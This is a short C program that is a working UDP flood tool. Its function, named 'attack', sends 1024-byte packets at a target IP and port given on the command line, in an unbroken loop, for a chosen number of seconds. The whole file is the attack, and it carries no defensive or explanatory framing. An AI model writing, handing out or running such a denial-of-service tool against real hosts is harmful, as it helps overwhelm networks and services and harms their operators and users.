#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define MAX_PACKET_SIZE 1024

void attack(const char *ip, int port, int duration) {
    int sock;
    struct sockaddr_in server_addr;
    char packet[MAX_PACKET_SIZE];

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    time_t end_time = time(NULL) + duration;
    while (time(NULL) < end_time) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <Port> <Duration>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    attack(ip, port, duration);
    return EXIT_SUCCESS;
}
